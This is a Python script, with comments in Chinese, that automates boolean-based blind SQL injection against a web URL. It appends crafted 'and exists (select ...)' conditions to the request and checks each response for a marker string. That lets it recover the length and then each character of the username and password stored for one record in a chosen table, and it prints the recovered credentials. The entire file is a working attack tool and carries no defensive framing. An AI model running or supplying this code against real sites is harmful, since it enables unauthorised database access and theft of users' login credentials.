import sys,requests,logging


#定义字段
class result():
    def __init__(self):
        self.id=None
        self.username=None
        self.password=None

class iSpider():
    def __init__(self, oriURL,oriStr,table):
        self.oriURL = oriURL
        self.oriStr = oriStr
        self.table=table
        self.resultList=[]

    def getResultList(self):
        #本次只需要一个结果
        tmp=result()
        tmp.id=1
        tmp.username=self.getData(1,'username')
        tmp.password=self.getData(1,'password')
        self.resultList.append(tmp)

    def getData(self,id,field):
        Length=self.getDataLength(id,field)
        logging.info("id为%d的记录:字段%s的长度为%d"%(id,field,Length))
        Data=""
        for i in range(1,Length+1):
            asc=33
            while requests.get("%s and exists (select id from %s where unicode(substring(%s,%d,1))=%d and ID=%d)"%(self.oriURL,self.table,field,i,asc,id)).text.find(self.oriStr)==-1:
                asc+=1
            Data+=chr(asc)
            logging.info("id为%d的记录:字段%s的第%d位为%s"%(id,field,i,chr(asc)))
        logging.info("id为%d的记录:字段%s的内容为%s"%(id,field,Data))
        return Data

    def getDataLength(self,id,field):
        Length=0
        while requests.get("%s and exists (select id from %s where len(%s)=%d and ID=%d)"%(self.oriURL,self.table,field,Length,id)).text.find(self.oriStr)==-1:
            Length+=1
        return Length

    def printAllResult(self):
        i=1
        for res in self.resultList:
            print("第%d条记录:id为%d username为%s password为%s"%(i,res.id,res.username,res.password))
            i+=1
            